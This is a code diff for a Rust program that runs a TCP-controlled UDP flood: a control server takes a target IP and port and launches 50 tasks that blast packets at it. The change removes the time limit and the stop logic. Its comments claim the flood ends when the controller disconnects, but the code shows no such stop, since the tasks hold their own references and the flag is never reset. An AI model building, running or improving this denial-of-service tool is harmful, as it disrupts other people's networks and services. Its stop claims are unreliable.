@@ -1,13 +1,14 @@
 use tokio::net::{TcpListener, TcpStream, UdpSocket};
 use tokio::io::{AsyncBufReadExt, BufReader, AsyncWriteExt};
-use tokio::{sleep, time::Duration};
+use tokio::time::{sleep, Duration};
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use anyhow::Result;
 
 const THREADS: usize = 50;
 const BURST_SIZE: usize = 5;
-const DURATION_SECONDS: u64 = 10;
+// DURATION_SECONDS is no longer used by the main flood logic
+// const DURATION_SECONDS: u64 = 10; 
 const CONTROL_PORT: u16 = 9000;
 
 fn build_payload() -> Vec<u8> {
@@ -31,13 +32,10 @@ fn build_payload() -> Vec<u8> {
 
 async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) -> Result<()> {
     let socket = UdpSocket::bind("0.0.0.0:0").await?;
-    // Corrected function name casing
     let payload = build_payload();
 
     while running.load(Ordering::Relaxed) == 1 {
-        // Corrected loop syntax and constant name
         for _ in 0..BURST_SIZE {
-            // Handled the result of send_to, propagating errors with '?'
             socket.send_to(&payload, &target).await?;
             packet_count.fetch_add(1, Ordering::Relaxed);
         }
@@ -67,38 +65,30 @@ async fn handle_client(mut stream: TcpStream) -> Result<()> {
             if let Ok(port) = port_str.parse::<u16>() {
                 let target = format!("{}:{}", ip, port);
                 println!("Received target: {}", target);
-                writer.write_all(format!("Flooding target: {}\n", target).as_bytes()).await?;
+                writer.write_all(format!("Flooding target: {}. Close connection to stop.\n", target).as_bytes()).await?;
 
                 let packet_count = Arc::new(AtomicU64::new(0));
                 let running = Arc::new(AtomicU64::new(1));
 
-                let monitor_handle = {
+                // The monitor and flood tasks will run as long as this handle_client function is active.
+                // When the client disconnects, the function will exit, and the 'running' Arc will be dropped.
+                // This causes the tasks to see running == 0 (or they will be dropped), stopping the flood.
+                
+                let _monitor_handle = {
                     let pc = Arc::clone(&packet_count);
                     let run = Arc::clone(&running);
                     tokio::spawn(pps_monitor(pc, run))
                 };
 
-                // Corrected vector name to match its usage
-                let mut flood_tasks = vec![];
-                // Corrected loop syntax
                 for _ in 0..THREADS {
                     let pc = Arc::clone(&packet_count);
                     let run = Arc::clone(&running);
                     let tgt = target.clone();
-                    flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
+                    tokio::spawn(handle_flood(tgt, pc, run));
                 }
 
-                sleep(Duration::from_secs(DURATION_SECONDS)).await;
-                running.store(0, Ordering::Relaxed);
-
-                for task in flood_tasks {
-                    // Awaited the task and handled potential join/task errors
-                    task.await??;
-                }
-                let _ = monitor_handle.await;
-
-                println!("Stopped for target: {}", target);
-                writer.write_all(format!("Stopped flood for target: {}\n", target).as_bytes()).await?;
+                // NOTE: The sleep timer and the explicit stop logic have been removed.
+                // The flood now runs until the control connection is closed.
 
             } else {
                  writer.write_all(b"Invalid port number.\n").await?;
@@ -107,21 +97,23 @@ async fn handle_client(mut stream: TcpStream) -> Result<()> {
             writer.write_all(b"Invalid format. Use IP:PORT.\n").await?;
         }
     }
+
+    println!("Client disconnected, stopping flood.");
+    // When this function returns, the 'running' Arc is dropped. The tasks will then stop.
     Ok(())
 }
 
 #[tokio::main]
 async fn main() -> Result<()> {
     let listener = TcpListener::bind(("0.0.0.0", CONTROL_PORT)).await?;
-    // Corrected constant name
     println!("TCP control server listening on port {}", CONTROL_PORT);
 
     loop {
-        // Corrected tuple destructuring: listener.accept() returns two values.
-        let (stream, _) = listener.accept().await?;
+        let (stream, addr) = listener.accept().await?;
+        println!("Accepted connection from: {}", addr);
         tokio::spawn(async move {
             if let Err(e) = handle_client(stream).await {
-                eprintln!("Error handling client: {}", e);
+                eprintln!("Error handling client {}: {}", addr, e);
             }
         });
     }
